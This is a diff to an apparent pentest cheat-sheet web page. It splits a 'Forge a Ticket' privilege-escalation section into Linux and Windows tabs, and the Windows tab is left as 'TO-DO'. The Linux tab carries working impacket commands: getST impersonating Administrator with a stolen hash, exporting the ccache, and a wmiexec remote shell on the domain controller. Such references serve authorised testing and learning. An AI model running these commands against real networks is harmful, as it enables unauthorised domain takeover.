@@ -199,7 +199,13 @@
 </ul>
 
 <div class="content"><hr>
-<h3 id="privesc-1-forge-a-ticket-from-linux">Privesc #1: Forge a Ticket (From Linux)</h3>
+<h3 id="privesc-1-forge-a-ticket">Privesc #1: Forge a Ticket</h3>
+<p>
+<button data-tabset="set1" data-tabcontent="tab1" class="active">Linux</button>
+
+<button data-tabset="set1" data-tabcontent="tab2" >Windows</button>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># For example, spn: www/dc.example.com (Check Bloodhound)</span>
 </span></span><span class="line"><span class="cl">sudo ntpdate -s &lt;DC&gt; <span class="o">&amp;&amp;</span> impacket-getST -dc-ip &lt;DC_IP&gt; -spn www/dc.example.com -hashes :&lt;HASH&gt; -impersonate Administrator &lt;DOMAIN&gt;/&lt;USER&gt;
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Export ccache</span>
@@ -207,6 +213,9 @@
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Remote</span>
 </span></span><span class="line"><span class="cl">sudo ntpdate -s &lt;DC&gt; <span class="o">&amp;&amp;</span> wmiexec.py -k -no-pass administrator@dc.example.com
 </span></span></code></pre></div><p><small><em>Note: impacket-wmiexec may not work</em></small></p>
+</div></div>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab2">TO-DO</div></p>
 <br></div></div>
     
     <script src="/js/utils.js"></script>
